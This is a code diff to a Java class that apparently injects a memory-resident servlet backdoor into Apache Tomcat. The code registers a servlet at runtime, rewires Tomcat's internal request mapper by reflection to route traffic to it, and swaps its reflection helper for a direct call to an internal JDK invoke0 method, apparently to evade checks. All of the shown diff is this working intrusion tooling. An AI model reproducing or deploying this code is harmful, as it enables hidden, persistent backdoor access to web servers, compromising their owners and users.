@@ -72,7 +72,7 @@ public class TSMSFromRequest implements Servlet {
 										response = (HttpServletResponse) getFieldValue(getFieldValue(req, "request"), "response");
 									} catch (Exception ignored) {
 										try {
-											response = (HttpServletResponse) invoke(req, "getResponse", (Object[]) null);
+											response = (HttpServletResponse) getMethodAndInvoke(req, "getResponse", null, null);
 										} catch (Exception ignored2) {
 										}
 									}
@@ -132,7 +132,7 @@ public class TSMSFromRequest implements Servlet {
 			ServletRegistration.Dynamic registration = new ApplicationServletRegistration(wrapper, standardContext);
 			registration.addMapping(new String[]{pattern});
 			registration.setLoadOnStartup(1);
-			if (getMethodByClass(wrapper.getClass(), "setServlet", Servlet.class) == null) {
+			if (getMethodByClass(wrapper.getClass(), "setServlet", new Class[]{Servlet.class}) == null) {
 				transform(standardContext, pattern);
 				servlet.init((ServletConfig) getFieldValue(wrapper, "facade"));
 			}
@@ -149,7 +149,7 @@ public class TSMSFromRequest implements Servlet {
 
 
 	public static void transform(Object standardContext, String path) throws Exception {
-		Object containerBase       = invoke(standardContext, "getParent", (Object[]) null);
+		Object containerBase       = getMethodAndInvoke(standardContext, "getParent", null, null);
 		Class  mapperListenerClass = Class.forName("org.apache.catalina.connector.MapperListener", false, containerBase.getClass().getClassLoader());
 		Field  listenersField      = Class.forName("org.apache.catalina.core.ContainerBase", false, containerBase.getClass().getClassLoader()).getDeclaredField("listeners");
 		listenersField.setAccessible(true);
@@ -170,7 +170,7 @@ public class TSMSFromRequest implements Servlet {
 						Object mapperListener_Mapper_hosts_contextList_context = Array.get(mapperListener_Mapper_hosts_contextList_contexts, k);
 						if (standardContext.equals(getFieldValue(mapperListener_Mapper_hosts_contextList_context, "object"))) {
 							new ArrayList();
-							Object standardContext_Mapper                                        = invoke(standardContext, "getMapper", (Object[]) null);
+							Object standardContext_Mapper                                        = getMethodAndInvoke(standardContext, "getMapper", null, null);
 							Object standardContext_Mapper_Context                                = getFieldValue(standardContext_Mapper, "context");
 							Object standardContext_Mapper_Context_exactWrappers                  = getFieldValue(standardContext_Mapper_Context, "exactWrappers");
 							Object mapperListener_Mapper_hosts_contextList_context_exactWrappers = getFieldValue(mapperListener_Mapper_hosts_contextList_context, "exactWrappers");
@@ -202,40 +202,33 @@ public class TSMSFromRequest implements Servlet {
 		}
 	}
 
-	public static Method getMethodByClass(Class cs, String methodName, Class... parameters) {
-		Method method = null;
-
+	public static java.lang.reflect.Method getMethodByClass(Class cs, String methodName, Class[] parameters) {
+		java.lang.reflect.Method method = null;
 		while (cs != null) {
 			try {
 				method = cs.getDeclaredMethod(methodName, parameters);
+				method.setAccessible(true);
 				cs = null;
-			} catch (Exception var6) {
+			} catch (Exception e) {
 				cs = cs.getSuperclass();
 			}
 		}
-
 		return method;
 	}
 
-	public static Object invoke(Object obj, String methodName, Object... parameters) {
+	public static Object getMethodAndInvoke(Object obj, String methodName, Class[] parameterClass, Object[] parameters) {
 		try {
-			ArrayList classes = new ArrayList();
-			if (parameters != null) {
-				for (int i = 0; i < parameters.length; ++i) {
-					Object o1 = parameters[i];
-					if (o1 != null) {
-						classes.add(o1.getClass());
-					} else {
-						classes.add((Object) null);
-					}
-				}
-			}
+			java.lang.reflect.Method method = getMethodByClass(obj.getClass(), methodName, parameterClass);
+			if (method != null) {
 
-			Method method = getMethodByClass(obj.getClass(), methodName, (Class[]) ((Class[]) classes.toArray(new Class[0])));
-			return method.invoke(obj, parameters);
-		} catch (Exception var7) {
-			return null;
+				Class                    clazz = Class.forName("sun.reflect.NativeMethodAccessorImpl");
+				java.lang.reflect.Method m     = clazz.getDeclaredMethod("invoke0", new Class[]{java.lang.reflect.Method.class, Object.class, Object[].class});
+				m.setAccessible(true);
+				return m.invoke(null, new Object[]{method, obj, parameters});
+			}
+		} catch (Exception ignored) {
 		}
+		return null;
 	}
 
 
